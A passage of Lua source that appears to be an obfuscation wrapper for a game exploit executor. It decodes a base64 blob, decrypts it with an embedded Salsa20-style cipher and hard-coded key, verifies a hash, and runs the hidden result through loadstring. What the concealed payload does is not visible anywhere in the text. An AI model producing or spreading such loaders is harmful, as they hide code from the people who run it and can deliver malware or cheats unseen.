3TCGBnzuUMJmifUsRXBaxjWcgtSB06G6fB8rYNSfvqfw2gKgAVQxo3gGTBpBlzsSXJqGRx6h+VBitIp7KDBFEfCTMMzC8Zn48Ikw5zGd9/9d3q4JHonhZ++yeBBED+YtVregHWtk7xgbvc8Woq8BtrrW9YHO0idflldiZWoDIVoG/JfZgR5Y5Vb0QvUi0yxHgaEASAqQy30Zwsf/NmjIb9f/9036dgPMDQuzreM7Qa+vfIq53FiAgwosXmicgE2dNWSCYUNiwwljEWOvuMiaZdEDGRmlqIPnrlWVwTKWoWWEx6clZ7/Vt5iO7Z4co1/jYrDjie4ok22KapmpysE4BsccYmn2xBntsPo8bBNAvZZ"
  local _b8 = "6/iO30yYYqRNezClLWmvAeFSajk2kvEvDICbf/w6VLdd0A5dW9ia2GaPGV+taXWXDLc+Q6guV+v6Mo+VqfKJOqy5p1PAX2yomckY1ZPh4W6g6OEJ2yPERSOGp8XZjwuoihMtqQczFrzqa3SguSO6rdhmAlyoS6EYEfXhs+EasaI2h5dhnU0AwLwjY0o40V9oCbuGclmdZ0e51Rg9jBqwBH23fdryqfO11yJk1bx9101knxj6xxp1emdCisIVdA7xnyBMLImqJp2pU93Y2gw2JC5zu0H06nzzCNJaMN20vpo+xdowAIPr6s8OTFdIlaXh1NfBeHqgoExosYryY03AxuhmCHDGLpEuS1kPQ7t0dpAAVwXQk/vuHHKSZFwAw+YHtbeG8TXilZRcKOnIcnNcgx52+8bKLNcyqhnuvcldQLvtAq+Kv7xSt36F62hPGvHrRnascXGrv79JvrqOhe2IslmEttVpOb8toCQ="

  local _bitLib = bit32 or bit
  local _bXor, _bRotl

  if _bitLib and _bitLib.bxor and _bitLib.lrotate then
    _bXor = function(a, b) return _bitLib.bxor(math.floor(tonumber(a) or 0) % 4294967296, math.floor(tonumber(b) or 0) % 4294967296) end
    _bRotl = function(x, n) return _bitLib.lrotate(math.floor(tonumber(x) or 0) % 4294967296, math.floor(tonumber(n) or 0) % 32) end
  elseif _bitLib and _bitLib.bxor and _bitLib.lshift and _bitLib.rshift then
    _bXor = function(a, b) return _bitLib.bxor(math.floor(tonumber(a) or 0) % 4294967296, math.floor(tonumber(b) or 0) % 4294967296) end
    _bRotl = function(x, n)
      x = math.floor(tonumber(x) or 0) % 4294967296
      n = math.floor(tonumber(n) or 0) % 32
      return (_bitLib.lshift(x, n) + _bitLib.rshift(x, 32 - n)) % 4294967296
    end
  else
    _bXor = function(a, b)
      a = math.floor(tonumber(a) or 0) % 4294967296
      b = math.floor(tonumber(b) or 0) % 4294967296
      local r, m = 0, 1
      while a > 0 or b > 0 do
        if (a % 2) ~= (b % 2) then r = r + m end
        a = math.floor(a / 2); b = math.floor(b / 2); m = m * 2
      end
      return r
    end
    _bRotl = function(x, n)
      x = math.floor(tonumber(x) or 0) % 4294967296
      n = math.floor(tonumber(n) or 0) % 32
      if n == 0 then return x end
      local p1 = math.floor(x / 2^(32 - n))
      local p2 = (x * 2^n) % 4294967296
      return (p1 + p2) % 4294967296
    end
  end

  local function _chr(v)
    return string.char(math.floor(tonumber(v) or 0) % 256)
  end

  local function _hex2bin(h)
    local o = {}
    for i = 1, #h, 2 do
      local v = tonumber(h:sub(i, i + 1), 16)
      if v then o[#o + 1] = _chr(v) end
    end
    return table.concat(o)
  end

  local function _b64d(s)
    local tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local o = {}
    for i = 1, #s, 4 do
      local a = (tbl:find(s:sub(i, i), 1, true) or 1) - 1
      local b = (tbl:find(s:sub(i + 1, i + 1), 1, true) or 1) - 1
      local c3 = s:sub(i + 2, i + 2)
      local c4 = s:sub(i + 3, i + 3)
      local c = c3 == "=" and 0 or (tbl:find(c3, 1, true) or 1) - 1
      local d = c4 == "=" and 0 or (tbl:find(c4, 1, true) or 1) - 1
      o[#o + 1] = _chr(a * 4 + math.floor(b / 16))
      if c3 ~= "=" then o[#o + 1] = _chr((b % 16) * 16 + math.floor(c / 4)) end
      if c4 ~= "=" then o[#o + 1] = _chr((c % 4) * 64 + d) end
    end
    return table.concat(o)
  end

  local _ltu = _hex2bin("5bd58e172eafa7dd06f9614eddb1d94ed95c0cf75d8e770c369bed9f576ac38b")
  local _sgh = _hex2bin("df0ebb9ed090e393")

  if #_ltu ~= 32 or #_sgh ~= 8 then
    _zpy = "invalid key/nonce"
    return
  end

  local SIG = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574}

  local function _block(k32, n32, ctr_lo, ctr_hi)
    local s = {
      SIG[1], k32[1], k32[2], k32[3], k32[4], SIG[2], n32[1], n32[2],
      ctr_lo, ctr_hi, SIG[3], k32[5], k32[6], k32[7], k32[8], SIG[4]
    }
    local o = {}
    for i = 1, 16 do o[i] = s[i] end

    local function qr(a, b, c2, d)
      s[b] = _bXor(s[b], _bRotl((s[a] + s[d]) % 4294967296, 7))
      s[c2] = _bXor(s[c2], _bRotl((s[b] + s[a]) % 4294967296, 9))
      s[d] = _bXor(s[d], _bRotl((s[c2] + s[b]) % 4294967296, 13))
      s[a] = _bXor(s[a], _bRotl((s[d] + s[c2]) % 4294967296, 18))
    end

    for _ = 1, 10 do
      qr(1, 5, 9, 13); qr(6, 10, 14, 2); qr(11, 15, 3, 7); qr(16, 4, 8, 12)
      qr(1, 2, 3, 4); qr(6, 7, 8, 5); qr(11, 12, 9, 10); qr(16, 13, 14, 15)
    end

    local out = {}
    for i = 1, 16 do
      local v = (s[i] + o[i]) % 4294967296
      v = math.floor(tonumber(v) or 0)
      out[#out + 1] = _chr(v % 256)
      out[#out + 1] = _chr(math.floor(v / 256) % 256)
      out[#out + 1] = _chr(math.floor(v / 65536) % 256)
      out[#out + 1] = _chr(math.floor(v / 16777216) % 256)
    end
    return table.concat(out)
  end

  local k32, n32 = {}, {}
  for i = 1, 8 do
    local p = (i - 1) * 4 + 1
    k32[i] = string.byte(_ltu, p)
           + string.byte(_ltu, p + 1) * 256
           + string.byte(_ltu, p + 2) * 65536
           + string.byte(_ltu, p + 3) * 16777216
  end
  for i = 1, 2 do
    local p = (i - 1) * 4 + 1
    n32[i] = string.byte(_sgh, p)
           + string.byte(_sgh, p + 1) * 256
           + string.byte(_sgh, p + 2) * 65536
           + string.byte(_sgh, p + 3) * 16777216
  end

  local raw = _b64d(table.concat({_b0, _b1, _b2, _b3, _b4, _b5, _b6, _b7, _b8}))
  local dec = {}
  local counter = 0
  local acc = {}

  for pos = 1, #raw, 64 do
    local lo = counter % 4294967296
    local hi = math.floor(counter / 4294967296) % 4294967296
    local block = _block(k32, n32, lo, hi)
    counter = counter + 1
    for i = 1, 64 do
      local idx = pos + i - 1
      if idx > #raw then break end
      acc[#acc + 1] = _chr(_bXor(string.byte(raw, idx), string.byte(block, i)))
    end
    if #acc >= 4096 then
      dec[#dec + 1] = table.concat(acc)
      acc = {}
    end
  end
  if #acc > 0 then dec[#dec + 1] = table.concat(acc) end

  _odo = table.concat(dec)

  local h = 0
  for i = 1, #_odo do
    h = (h * 16777619 + string.byte(_odo, i)) % 4294967296
  end
  if h ~= 2669253592 then
    _zpy = "hash mismatch"
    return
  end

  local _load = loadstring or load
  if not _load and getfenv then
    local ok, f = pcall(getfenv)
    if ok and type(f) == "table" then _load = f.loadstring or f.load end
  end
  if not _load then
    _zpy = "no loadstring available in this executor"
    return
  end

  local _okTest, _compiledTest = _ttd(_load, "return 2+2")
  if not _okTest or not _compiledTest then
    _zpy = "loadstring check failed"
    return
  end
  local _okRun, _res = _ttd(_compiledTest)
  if not _okRun or _res ~= 4 then
    _zpy = "loadstring execution check failed"
    return
  end

  local _okComp, _fn = _ttd(_load, _odo)
  if not _okComp or not _fn then
    _zpy = "compilation failed"
    return
  end

  local _okExec, _execErr = _ttd(_fn)
  if not _okExec then
    _zpy = "execution failed: " .. tostring(_execErr)
  end
end

local _okGlobal, _globalErr = _ttd(_safeRun)
if not _okGlobal then
  warn("[obf] wrapper crashed: " .. tostring(_globalErr))
elseif _zpy then
  warn("[obf] " .. tostring(_zpy))
end
